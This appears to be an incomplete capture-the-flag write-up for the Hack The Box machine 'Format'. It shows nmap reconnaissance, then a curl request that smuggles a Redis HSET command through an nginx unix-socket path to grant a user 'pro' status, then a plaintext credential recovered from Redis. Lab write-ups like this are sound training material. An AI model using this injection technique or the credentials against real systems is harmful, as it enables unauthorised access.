# #1 Introduction
<img width="693" alt="image" src="https://github.com/Mate0r/app.hackthebock.com/assets/94843357/824447ee-ce67-4ed7-8a3c-6fec9beb1c37">

# #2 nmap

we first add a domain in /etc/hosts so we don't need to remember the IP
```bash
10.10.xx.xx format.htb
```

we run an nmap scan as sudo so it's doing a SYN scan and not a full TCP connection so it's faster

```bash
sudo nmap -T4 -sV -p- format.htb
```

we got these open ports
```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp   open  http    nginx 1.18.0
3000/tcp open  http    nginx 1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# #3 user.txt

## HTTP (port 80)


port 80 : web app named microblog
port 3000 : gitea 1.17.3
-> user : cooper

bulletproof seems to be vulnerable
we can see a subdomaine sunny that have edit

curl -X HSET http://microblog.htb/static/unix:%2Fvar%2Frun%2Fredis%2Fredis.sock:mateor%20pro%20true%20/HTTP/1.1 

redis-cli -s /var/run/redis/redis.sock
cooper:zooperdoopercooper


